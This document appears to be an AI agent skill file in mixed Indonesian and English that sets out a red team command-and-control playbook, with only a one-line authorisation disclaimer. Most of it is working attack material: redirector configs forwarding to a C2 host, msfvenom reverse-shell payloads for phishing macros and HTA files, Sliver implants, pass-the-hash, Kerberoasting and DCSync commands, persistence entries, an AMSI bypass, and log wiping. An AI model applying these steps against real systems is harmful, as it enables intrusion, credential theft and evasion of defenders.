---
name: redteam-c2
description: |
  Red team operations & C2 (Command and Control) dalam Bahasa Indonesia. Gunakan saat user mau setup C2 infrastructure, lateral movement, atau full red team engagement.
  kata kunci: red team, c2, command and control, cobalt strike, sliver, mythic, havoc, sliver c2, lateral movement, persistence, post exploitation, red team ops.
---

# Red Team / C2 — Command & Control Infrastructure

> **Disclaimer:** Skill ini HANYA untuk authorized red team engagement dengan izin tertulis. Operasi tanpa izin = ILEGAL. JANGAN nekat.

---

## Pendahuluan

Red team = tim yang simulate attacker real-world. C2 = infrastructure buat control compromised hosts.

**Intensity guide:**
- `INTENSITY 1-3`: Research (pahami C2 options)
- `INTENSITY 4-6`: Setup (deploy C2 infrastructure)
- `INTENSITY 7-9`: Operations (full red team engagement)
- `INTENSITY 10`: Advanced (custom C2, evasion, persistence)

---

## Tahap 1 — C2 Framework Selection

> Pilih C2 framework yang cocok.

### C2 Framework Comparison

| Framework | Type | Cost | Pros | Cons |
|-----------|------|------|------|------|
| **Cobalt Strike** | Commercial | $$$$ | Industry standard, mature | Expensive |
| **Sliver** | Open-source | Free | Cross-platform, customizable | Less GUI |
| **Mythic** | Open-source | Free | Multi-language, modular | Complex setup |
| **Havoc** | Open-source | Free | Modern, easy use | Newer |
| **Brute Ratel** | Commercial | $$$ | Evasion-focused | Controversial |
| **Empire** | Open-source | Free | PowerShell focus | Limited |

### Recommended Stack

```
┌─────────────────────────────────────┐
│           C2 Framework              │
│  (Sliver/Cobalt Strike/Mythic)     │
├─────────────────────────────────────┤
│           Redirectors              │
│  (Nginx, Cloudflare Workers)       │
├─────────────────────────────────────┤
│           Malleable C2             │
│  (Profile masquerading)            │
├─────────────────────────────────────┤
│           Payload Generation       │
│  (Shellcode, DLL, EXE)            │
└─────────────────────────────────────┘
```

---

## Tahap 2 — Infrastructure Setup

> Deploy C2 infrastructure yang resilient.

### Server Setup

```bash
# 1. Get VPS
# Recommended: DigitalOcean, Vultr, Linode
# Location: Choose based on target geography

# 2. Setup domain
# Use Cloudflare for DNS
# Create subdomains: api.target.com, cdn.target.com

# 3. Setup redirector
# Nginx reverse proxy to C2 server

# 4. SSL/TLS
# Let's Encrypt for certificates
```

### Nginx Redirector

```nginx
server {
    listen 443 ssl;
    server_name api.target.com;
    
    ssl_certificate /etc/letsencrypt/live/api.target.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/api.target.com/privkey.pem;
    
    location / {
        proxy_pass https://127.0.0.1:7443;  # C2 listener
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
    
    # Decoy content
    location /images/ {
        root /var/www/html;
    }
}
```

### Cloudflare Worker (Advanced)

```javascript
// Cloudflare Worker as redirector
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  // Forward to C2
  return fetch('https://your-c2.com' + request.url, {
    method: request.method,
    headers: request.headers,
    body: request.body
  })
}
```

---

## Tahap 3 — C2 Profile / Malleable C2

> Disguise C2 traffic as legitimate.

### Cobalt Strike Malleable C2

```
# Malleable C2 profile (beacon.profile)
set sample_name "Windows Update";
set sleeptime "5000";
set jitter    "0";

# HTTP config
set uri "/update";
set port     443;

# Headers
header "Accept" "application/json";
header "Content-Type" "application/json";

# Post-ex
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
```

### Sliver Profile

```bash
# Generate Sliver profile
sliver-server> profiles new --mtls your-c2.com --os windows --arch amd64 --save /tmp/implant.exe

# Or with HTTP
sliver-server> profiles new --http your-c2.com --os windows --arch amd64
```

---

## Tahap 4 — Payload Generation

> Generate implant untuk target.

### msfvenom

```bash
# Windows EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=your-c2.com LPORT=443 -f exe -o implant.exe

# Windows DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=your-c2.com LPORT=443 -f dll -o implant.dll

# Windows Shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=your-c2.com LPORT=443 -f raw -o shellcode.bin

# Stageless vs staged
# Stageless: larger, more stable
# Staged: smaller, needs handler
```

### Sliver Payload

```bash
# Generate Sliver implant
sliver-server> generate --mtls your-c2.com --os windows --arch amd64 --save /tmp/implant.exe

# With HTTP
sliver-server> generate --http your-c2.com,c2-backup.com --os windows

# With DNS
sliver-server> generate --dns your-c2.com --os windows
```

---

## Tahap 5 — Initial Access

> Get initial foothold di target.

### Phishing

```bash
# Generate phishing document
# Macro document
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=your-c2.com LPORT=443 -f vba -o macro.vba

# HTA file
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=your-c2.com LPORT=443 -f hta-psh -o payload.hta

# ISO/IMG
# Create ISO with payload
```

### Supply Chain

```bash
# Compromise software update
# Modify installer to include payload

# Trojanized DLL
# Replace legitimate DLL with malicious one
```

### Web Exploit

```bash
# Exploit web application
# Upload webshell
# Get reverse shell
```

---

## Tahap 6 — Lateral Movement

> Move from one host to another di network.

### Pass-the-Hash

```bash
# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee:da769...

# Impacket psexec
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:da769... admin@192.168.1.100

# Impacket wmiexec
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:da769... admin@192.168.1.100
```

### Pass-the-Ticket

```bash
# Rubeus
Rubeus.exe ptt /ticket:base64ticket

# Impacket
ticketer.py -nthash da769... -domain-sid S-1-5-21-... -domain DOMAIN admin
```

### Kerberoasting

```bash
# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# Impacket
GetUserSPNs.py domain/user:password -request -outputfile hashes.txt

# Crack hashes
hashcat -m 13100 hashes.txt wordlist.txt
```

### DCSync

```bash
# Impacket secretsdump
secretsdump.py domain/admin:password@dc01.domain.com

# Mimikatz
mimikatz # lsadump::dcsync /user:domain\krbtgt
```

---

## Tahap 7 — Post Exploitation

> Maintain access, escalate, exfiltrate.

### Persistence

```bash
# Registry run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\temp\implant.exe" /f

# Scheduled task
schtasks /create /tn "Updater" /tr "C:\temp\implant.exe" /sc onlogon /f

# WMI event subscription
# (See malware-dev module)

# Service
sc create Updater binPath= "C:\temp\implant.exe" start= auto
```

### Privilege Escalation

```bash
# Potato attacks
# JuicyPotato, PrintSpoofer, GodPotato

# UAC bypass
# Fodhelper, ComputerDefaults, EventViewer

# Token impersonation
# SeImpersonatePrivilege exploitation
```

### Data Exfiltration

```bash
# Compress and encrypt
7z a -p encrypted.7z *.txt *.docx *.pdf

# Exfiltrate via DNS
# Exfiltrate via HTTPS
# Exfiltrate via ICMP
```

---

## Tahap 8 — Defense Evasion

> Bypass security controls.

### EDR Bypass

```bash
# Direct syscall
# Unhook ntdll
# Manual mapping
# Process hollowing
# (See edr-bypass module)
```

### AMSI Bypass

```powershell
# Patch amsi.dll
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### ETW Bypass

```powershell
# Patch EtwEventWrite
# (See edr-bypass module)
```

---

## Tahap 9 — Cleanup

> Remove artifacts after engagement.

### Cleanup Checklist

```bash
# 1. Remove persistence
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /f
schtasks /delete /tn "Updater" /f
sc delete Updater

# 2. Remove files
del /f /q C:\temp\implant.exe
del /f /q C:\temp\*

# 3. Clear logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# 4. Clear PowerShell history
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force

# 5. Clear browser history
# (If applicable)

# 6. Remove artifacts
# Delete any created users
# Remove scheduled tasks
# Remove WMI subscriptions
```

---

## C2 Best Practices

| Practice | Description |
|----------|-------------|
| **Use redirectors** | Hide C2 server behind proxies |
| **Rotate infrastructure** | Change IPs/domains regularly |
| **Malleable profiles** | Disguise C2 as legitimate traffic |
| **Sleep jitter** | Randomize beacon intervals |
| **Kill date** | Auto-exit after engagement |
| **Credentials** | Use unique creds per engagement |
| **Logging** | Log all C2 commands |

---

## Tools Cheat Sheet

| Tool | Fungsi |
|------|--------|
| **Sliver** | Open-source C2 |
| **Cobalt Strike** | Commercial C2 |
| **Mythic** | Modular C2 |
| **Havoc** | Modern C2 |
| **Impacket** | Lateral movement |
| **CrackMapExec** | Network exploitation |
| **Rubeus** | Kerberos attacks |
| **Mimikatz** | Credential theft |
| **Covenant** | .NET C2 |

---

## See Also (Module Terkait)

| Jika Task Lo... | Module Lain yang Relevan |
|-----------------|-------------------------|
| EDR bypass | `core/edr-bypass/SKILL.md` — EDR evasion |
| Malware development | `core/malware-dev/SKILL.md` — Custom implants |
| Active Directory | `core/active-directory/SKILL.md` — AD attacks |
| Privilege escalation | `core/exploit-dev/windows-privesc/SKILL.md` — Windows privesc |
| Network recon | `core/network-recon/SKILL.md` — Recon |
| Breach workflows | `core/breach-workflows/SKILL.md` — Full chain |

---

## Resources

- **MITRE ATT&CK**: https://attack.mitre.org/
- **The Hacker Playbook**: Book
- **Red Team Development**: Book
- **Sliver Documentation**: https://sliver.sh/
- **Cobalt Strike Documentation**: https://cobaltstrike.com/
- **Impacket**: https://github.com/fortra/impacket
